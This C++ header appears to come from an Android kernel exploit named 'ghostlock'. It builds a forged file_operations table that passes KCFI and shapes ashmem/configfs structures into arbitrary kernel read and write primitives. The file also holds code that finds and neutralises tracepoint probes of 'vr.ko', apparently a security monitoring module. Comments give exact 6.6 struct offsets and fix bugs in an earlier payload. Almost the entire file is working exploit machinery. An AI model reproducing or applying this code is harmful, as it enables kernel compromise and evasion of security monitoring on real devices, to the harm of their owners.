#ifndef GHOSTLOCK_CFI_LAYOUT_HPP
#define GHOSTLOCK_CFI_LAYOUT_HPP

/*
 * Pure encoders for the CFI (fops hijack) stage.
 *
 * Split out of `cfi_stage.cpp` on purpose: this header pulls in nothing but
 * `<cstdint>` / `<array>` / `<cstring>` and `memory/payload_builder.h`, so the
 * forged table and the two `struct configfs_buffer` shaping blobs can be
 * asserted byte-for-byte by a host test. The attack and the resident read/write
 * stay in `cfi_stage.cpp`.
 *
 * Every offset below is a kernel struct offset, not a design choice:
 *   - `struct file_operations` slots come from `kernel/target.h` (FOPS_*_OFF),
 *     which mirrors the fixed declaration order on 6.6 (8 bytes per slot).
 *   - `struct configfs_buffer` offsets come from 6.6 `fs/configfs/file.c`:
 *     `count 0x0, pos 0x8, page 0x10, ops 0x20, mutex 0x28(48B),
 *      needs_read_fill 0x50, read_in_progress 0x51, write_in_progress 0x52,
 *      bin_buffer 0x58, bin_buffer_size 0x60, cb_max_size 0x64`.
 *   - the whole struct is overlaid on `struct ashmem_area`, whose `name` is
 *     written at `name + ASHMEM_NAME_PREFIX_LEN`, so the ioctl-visible window
 *     starts 11 bytes into the object. That shift is why every blob offset is
 *     `kernel_offset - kAshmemNamePrefixLen`.
 */

#include "kernel/constants.hpp"
#include "kernel/target.h"
#include "memory/payload_builder.h"

#include <array>
#include <cstddef>
#include <cstdint>
#include <cstring>

namespace ghostlock::session::backend {
    /* Absolute kernel-image addresses of the functions the forged table points
     * at. Every one of them must be a real kernel function: KCFI passes because
     * the callee carries its own type hash, so nothing may be synthesized. */
    struct CfiSymbols final {
        uintptr_t ashmem_ioctl = 0;
        uintptr_t ashmem_compat_ioctl = 0;
        uintptr_t ashmem_mmap = 0;
        uintptr_t ashmem_open = 0;
        uintptr_t ashmem_release = 0;
        uintptr_t ashmem_show_fdinfo = 0;
        uintptr_t copy_splice_read = 0;
        /* read_iter / write_iter come from configfs: the forged table turns the
         * ashmem fd into a configfs bin file. `configfs_bin_read_iter` is used
         * rather than the upstream payload's `configfs_read_iter`, which is
         * gated on `buffer->count` — and `count` lands on `ashmem_area.size`,
         * outside the writable window, so it reads back 0 every time. */
        uintptr_t configfs_bin_read_iter = 0;
        uintptr_t configfs_bin_write_iter = 0;
        /* llseek as first sprayed. rb_erase separately writes over
         * `fake_fops + FOPS_LLSEEK_OFF`, so the value that arrives there is the
         * erase node's own `rb_parent_color` (the word written into
         * `&ashmem_misc.fops`). Seeded with noop_llseek so the table is complete
         * even before the repair write. */
        uintptr_t llseek_after_erase = 0;
        /* The real ashmem fops table, needed by the eventual restore. */
        uintptr_t ashmem_fops = 0;

        /* ---- vr.ko probe neutralisation (step 3) ----------------------------
         * The two tracepoints vr.ko attaches to, the geometry of
         * `struct tracepoint` on this kernel, and the fixed code delta between
         * vr's commit_creds probe and its sys_exit probe. The struct layout is
         * NOT the one upstream 6.6 declares: this kernel is built without
         * CONFIG_HAVE_STATIC_CALL, so `static_call_key` / `static_call_tramp`
         * are absent and everything from `iterator` on sits 16 bytes lower.
         * Verified against this device's own vmlinux, see the step-3 evidence. */
        uintptr_t sys_exit_tp = 0;
        uintptr_t commit_creds_tp = 0;
        size_t tracepoint_probestub_off = 0;
        size_t tracepoint_funcs_off = 0;
        size_t tracepoint_func_stride = 0;
        uint64_t vr_commit_to_sysexit_delta = 0;
        /* Kernel image bounds, used to tell a module-region probe from an
         * in-image one. */
        uintptr_t kernel_image_lo = 0;
        uintptr_t kernel_image_hi = 0;

        [[nodiscard]] bool complete() const noexcept {
            return ashmem_ioctl != 0 && ashmem_compat_ioctl != 0 &&
                   ashmem_mmap != 0 && ashmem_open != 0 && ashmem_release != 0 &&
                   ashmem_show_fdinfo != 0 && copy_splice_read != 0 &&
                   configfs_bin_read_iter != 0 && configfs_bin_write_iter != 0 &&
                   llseek_after_erase != 0;
        }

        /* vr.ko's symbols are a separate, optional group: a device or profile
         * without them still gets the CFI channel, just not the global probe
         * neutralisation. */
        [[nodiscard]] bool vr_neutralize_ready() const noexcept {
            return sys_exit_tp != 0 && commit_creds_tp != 0 &&
                   tracepoint_probestub_off != 0 && tracepoint_funcs_off != 0 &&
                   tracepoint_func_stride != 0 && vr_commit_to_sysexit_delta != 0 &&
                   kernel_image_lo != 0 && kernel_image_hi > kernel_image_lo;
        }
    };

    /* ashmem.c: prefix memcpy'd into `asma->name`; private names land after it. */
    inline constexpr size_t kAshmemNamePrefixLen = 11;
    inline constexpr size_t kCfgPageOff = 0x10;
    inline constexpr size_t kCfgNeedsReadFillOff = 0x50;
    inline constexpr size_t kCfgBinBufferOff = 0x58;
    inline constexpr size_t kCfgBinBufferSizeOff = 0x60;
    inline constexpr size_t kCfgCbMaxSizeOff = 0x64;
    /* "dev/ashmem" read as a little-endian u64. The read path derives `pos` from
     * it so that `page + pos == target`, the same trick the upstream payload
     * uses (ASHMEM_PREFIX_COUNT at common.h:67). */
    inline constexpr uint64_t kAshmemPrefixCount = 0x6d6873612f766564ULL;
    inline constexpr size_t kShapeBlobSize = 128;

    /* `struct file_operations` slot offsets for the ten members the forged
     * table fills. Written down here, from the 6.6 declaration order (see the
     * header comment), so the layout never depends on a per-device selection
     * header that is not part of this build; `naming/target.h` also carries the
     * 6.6 payload-page constants these slots are unrelated to. */
    inline constexpr size_t kLlseekSlotOff = 0x08;
    inline constexpr size_t kReadIterSlotOff = 0x20;
    inline constexpr size_t kWriteIterSlotOff = 0x28;
    inline constexpr size_t kIoctlSlotOff = 0x48;
    inline constexpr size_t kCompatIoctlSlotOff = 0x50;
    inline constexpr size_t kMmapSlotOff = 0x58;
    inline constexpr size_t kOpenSlotOff = 0x68;
    inline constexpr size_t kReleaseSlotOff = 0x78;
    inline constexpr size_t kSpliceReadSlotOff = 0xb8;
    inline constexpr size_t kShowFdinfoSlotOff = 0xd8;

    /* Write the forged table into `page` at `fake_fops`. Returns false without
     * writing when the address is misaligned or the table would not fit, so a
     * caller never gets a half-built table. */
    [[nodiscard]] inline bool build_fake_fops_table(
        std::span<unsigned char> page, uintptr_t fake_fops,
        const CfiSymbols &symbols) noexcept {
        if (page.empty() || (fake_fops & 0x7U) != 0) return false;
        const uintptr_t base = reinterpret_cast<uintptr_t>(page.data());
        if (fake_fops < base) return false;
        const size_t off = static_cast<size_t>(fake_fops - base);
        if (off > page.size() || page.size() - off < memory::kFakeFopsTableBytes) {
            return false;
        }
        unsigned char *table = page.data() + off;
        std::memset(table, 0, static_cast<size_t>(memory::kFakeFopsTableBytes));

        auto put = [table](size_t slot, uintptr_t value) {
            std::memcpy(table + slot, &value, sizeof(value));
        };
        put(kLlseekSlotOff, symbols.llseek_after_erase);
        put(kReadIterSlotOff, symbols.configfs_bin_read_iter);
        put(kWriteIterSlotOff, symbols.configfs_bin_write_iter);
        put(kIoctlSlotOff, symbols.ashmem_ioctl);
        put(kCompatIoctlSlotOff, symbols.ashmem_compat_ioctl);
        put(kMmapSlotOff, symbols.ashmem_mmap);
        put(kOpenSlotOff, symbols.ashmem_open);
        put(kReleaseSlotOff, symbols.ashmem_release);
        put(kSpliceReadSlotOff, symbols.copy_splice_read);
        put(kShowFdinfoSlotOff, symbols.ashmem_show_fdinfo);
        /* owner / read / write / iopoll / ... stay NULL: nothing on this path
         * calls them, and a NULL keeps an accidental call loud. */
        return true;
    }

    /* The ten slots above are the ones the forged table must fill. Pin their
     * offsets to the 6.6 declaration order: a target header that silently moved
     * one would turn this table into a call to the wrong function. */
    static_assert(kLlseekSlotOff == 0x08);
    static_assert(kReadIterSlotOff == 0x20);
    static_assert(kWriteIterSlotOff == 0x28);
    static_assert(kIoctlSlotOff == 0x48);
    static_assert(kCompatIoctlSlotOff == 0x50);
    static_assert(kMmapSlotOff == 0x58);
    static_assert(kOpenSlotOff == 0x68);
    static_assert(kReleaseSlotOff == 0x78);
    static_assert(kSpliceReadSlotOff == 0xb8);
    static_assert(kShowFdinfoSlotOff == 0xd8);

    /* Shape `private_data` so the *next* `pwrite` on the hijacked fd copies the
     * user buffer into `target + iocb->ki_pos`. `bin_buffer_size` is zeroed so
     * `configfs_bin_write_iter` takes its `end_offset > bin_buffer_size` branch,
     * where an existing `bin_buffer` means it writes straight through instead of
     * vmalloc'ing a fresh buffer. */
    [[nodiscard]] inline std::array<unsigned char, kShapeBlobSize>
    build_shape_write_blob(uintptr_t target) noexcept {
        std::array<unsigned char, kShapeBlobSize> blob{};
        const uint64_t target64 = target;
        std::memcpy(blob.data() + (kCfgBinBufferOff - kAshmemNamePrefixLen),
                    &target64, sizeof(target64));
        const uint32_t zero = 0;
        std::memcpy(blob.data() + (kCfgBinBufferSizeOff - kAshmemNamePrefixLen),
                    &zero, sizeof(zero));
        std::memcpy(blob.data() + (kCfgCbMaxSizeOff - kAshmemNamePrefixLen),
                    &zero, sizeof(zero));
        return blob;
    }

    /* True when `address` falls inside the kernel image. A tracepoint callback
     * in that range belongs to the kernel itself; anything outside it is a
     * module (or garbage), which is how vr.ko's probes are identified. */
    [[nodiscard]] inline constexpr bool image_contains_address(
        uintptr_t address, uintptr_t image_lo, uintptr_t image_hi) noexcept {
        return address >= image_lo && address < image_hi;
    }

    /* Upper bound on how many `struct tracepoint_func` entries to walk. The
     * array length is a runtime count with no field for it, so the walk stops at
     * the first NULL `func`; this is only the safety cap. */
    /* `sizeof(struct tracepoint_func)`: { void *func; void *data; int prio; }.
     * This one is the same on every 64-bit kernel, so it stays a constant; the
     * per-kernel fields live in CfiSymbols. */
    inline constexpr size_t kTracepointFuncStride = 24;

    inline constexpr size_t kTracepointFuncScanMax = 256;
    inline constexpr size_t kMaxModuleProbes = 8;

    /* Pick, out of one tracepoint's funcs[] snapshot, the callbacks that live
     * outside the kernel image -- i.e. module-region probes such as vr.ko's.
     *
     * `read` returns false when a slot cannot be read; a slot holding a zero
     * `func` terminates the array (that is how the kernel sizes it). Callbacks
     * whose address lands inside the image are skipped on purpose: they are the
     * kernel's own tracepoint consumers (perf, BPF, function_graph), and
     * rewriting one would break kernel functionality rather than vr.ko. */
    template <class ReadFn>
    [[nodiscard]] inline size_t collect_module_probes(
        ReadFn &&read, uintptr_t funcs, size_t func_stride, uintptr_t image_lo,
        uintptr_t image_hi, uintptr_t (&out)[kMaxModuleProbes]) noexcept {
        if (func_stride == 0) return 0;
        size_t found = 0;
        for (size_t index = 0; index < kTracepointFuncScanMax; ++index) {
            const uintptr_t slot = funcs + index * func_stride;
            uintptr_t func = 0;
            if (!read(slot, func)) break;
            if (func == 0) break;
            if (image_contains_address(func, image_lo, image_hi)) continue;
            if (found == kMaxModuleProbes) break;
            out[found++] = func;
        }
        return found;
    }

    /* `iocb->ki_pos` for a read of `len` bytes that must start at `target`.
     * `page` in the blob is then `target - read_pos(len)`, so the kernel's
     * `page + ki_pos` is exactly `target`. */
    [[nodiscard]] inline constexpr uint64_t read_pos(size_t len) noexcept {
        return kAshmemPrefixCount - static_cast<uint64_t>(len);
    }

    /* Shape `private_data` so the next `pread` at `read_pos(len)` reads exactly
     * `target`. `needs_read_fill` is cleared so `configfs_bin_read_iter` skips
     * the fragment/attribute machinery entirely.
     *
     * The address arithmetic is exact, not approximate — the whole read path
     * hinges on it. `configfs_bin_read_iter` ends in
     * `copy_to_iter(buffer->bin_buffer + iocb->ki_pos, ...)`, and the kernel's
     * `_copy_to_iter` passes `addr + off` straight to `raw_copy_to_user`, i.e.
     * the source is the raw address `page + ki_pos`. So `page` must be
     * `target - ki_pos` with **no** page-boundary rounding.
     *
     * The upstream payload instead uses `target - (ki_pos & ~0xfff)`
     * (Neo11Plus `util.c` configfs_read_once), which lands every read at
     * `target + (ki_pos & 0xfff)` — 0x55c bytes past the requested address for
     * the 8-byte read its own llseek self-check performs. That is why that check
     * could never pass on a real device. Do not reintroduce the rounding. */
    [[nodiscard]] inline std::array<unsigned char, kShapeBlobSize>
    build_shape_read_blob(uintptr_t target, size_t len) noexcept {
        std::array<unsigned char, kShapeBlobSize> blob{};
        const uintptr_t page = target - static_cast<uintptr_t>(read_pos(len));
        /* The read must not wrap: a wrapped `page` would be handed to the
         * kernel as a source address. */
        if (page > target) return blob;
        std::memcpy(blob.data() + (kCfgPageOff - kAshmemNamePrefixLen),
                    &page, sizeof(page));
        const uint32_t zero = 0;
        std::memcpy(blob.data() + (kCfgNeedsReadFillOff - kAshmemNamePrefixLen),
                    &zero, sizeof(zero));
        return blob;
    }

} // namespace ghostlock::session::backend

#endif
